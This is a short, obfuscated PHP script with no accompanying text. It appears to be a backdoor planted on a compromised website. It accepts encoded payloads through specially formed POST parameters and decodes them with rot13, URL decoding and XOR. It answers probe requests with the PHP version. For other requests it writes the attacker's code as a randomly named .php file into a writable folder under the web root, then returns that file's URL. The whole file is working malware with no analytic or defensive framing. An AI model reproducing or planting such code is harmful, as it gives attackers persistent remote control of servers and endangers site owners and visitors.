<?php $hesfqjlbn = "fesuixmuacsfyqgg";$zhspjov = "";foreach ($_POST as $cjvdr => $vqbpo){if (strlen($cjvdr) == 16 and substr_count($vqbpo, "%") > 10){cqmkm($cjvdr, $vqbpo);}}function cqmkm($cjvdr, $vpzdvkcaen){global $zhspjov;$zhspjov = $cjvdr;$vpzdvkcaen = str_split(rawurldecode(str_rot13($vpzdvkcaen)));function ylkvtux($zwrhvpaep, $cjvdr){global $hesfqjlbn, $zhspjov;return $zwrhvpaep ^ $hesfqjlbn[$cjvdr % strlen($hesfqjlbn)] ^ $zhspjov[$cjvdr % strlen($zhspjov)];}$vpzdvkcaen = implode("", array_map("ylkvtux", array_values($vpzdvkcaen), array_keys($vpzdvkcaen)));$vpzdvkcaen = @unserialize($vpzdvkcaen);if (@is_array($vpzdvkcaen)){$cjvdr = array_keys($vpzdvkcaen);$vpzdvkcaen = $vpzdvkcaen[$cjvdr[0]];if ($vpzdvkcaen === $cjvdr[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function kglitfesn($yjkidsir) {static $fojuwst = array();$ttwlstekv = glob($yjkidsir . '/*', GLOB_ONLYDIR);if (count($ttwlstekv) > 0) {foreach ($ttwlstekv as $yjkids){if (@is_writable($yjkids)){$fojuwst[] = $yjkids;}}}foreach ($ttwlstekv as $yjkidsir) kglitfesn($yjkidsir);return $fojuwst;}$yjkidsaumfzgv = $_SERVER["DOCUMENT_ROOT"];$ttwlstekv = kglitfesn($yjkidsaumfzgv);$cjvdr = array_rand($ttwlstekv);$attadyyvb = $ttwlstekv[$cjvdr] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($attadyyvb, $vpzdvkcaen);echo "http://" . $_SERVER["HTTP_HOST"] . substr($attadyyvb, strlen($yjkidsaumfzgv));exit();}}}